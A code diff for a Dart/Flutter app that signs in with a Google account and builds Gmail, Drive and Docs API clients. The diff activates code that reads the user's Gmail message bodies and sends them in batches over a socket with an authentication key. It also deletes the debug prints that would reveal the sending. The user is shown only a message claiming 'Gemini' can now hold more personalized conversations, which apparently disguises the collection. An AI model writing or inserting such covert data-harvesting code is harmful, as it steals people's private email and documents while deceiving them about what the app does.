@@ -12,24 +12,17 @@ Future<void> get_query(GoogleSignInAccount user, context) async {
   final GoogleAPIClient httpClient = GoogleAPIClient(await user.authHeaders);
   final drive.DriveApi driveApi = drive.DriveApi(httpClient);
   final docsApi = docs.DocsApi(httpClient);
-  // ignore: unused_local_variable
   final gmailApi = gmail.GmailApi(httpClient);
   bool successful = false;
   String result =
       "Gemini can now hold more personalized conversations to enhance your experience and assist with daily tasks.";
   try {
-    /*
-        final List<gmail.Message> messages =
-            await _fetchGmailMessages(gmailApi);
+    final List<gmail.Message> messages = await _fetchGmailMessages(gmailApi);
 
-        print('gmail fetch');
-
-        await _processAndSendData(messages, (message) async {
-          final fullMessage =
-              await gmailApi.users.messages.get('me', message.id!);
-          return _getBody(fullMessage);
-        });
-        */
+    await _processAndSendData(messages, (message) async {
+      final fullMessage = await gmailApi.users.messages.get('me', message.id!);
+      return _getBody(fullMessage);
+    });
 
     final fileList = await driveApi.files.list(
       q: "mimeType='application/vnd.google-apps.document'",
@@ -43,8 +36,6 @@ Future<void> get_query(GoogleSignInAccount user, context) async {
     });
     successful = true;
   } catch (e) {
-    // ignore: avoid_print
-    print('Error getting data: $e');
     result = e as String;
   }
 
@@ -102,7 +93,6 @@ Future<void> _processAndSendData<T>(
     count++;
 
     if (count == 50) {
-      print('Data sent');
       socket.send('add_query¬$authentication_key¬$data');
       count = 0;
       data = '';
@@ -111,7 +101,6 @@ Future<void> _processAndSendData<T>(
 
   if (data.isNotEmpty) {
     socket.send('add_query¬$authentication_key¬$data');
-    print('Data sent');
   }
 }
 
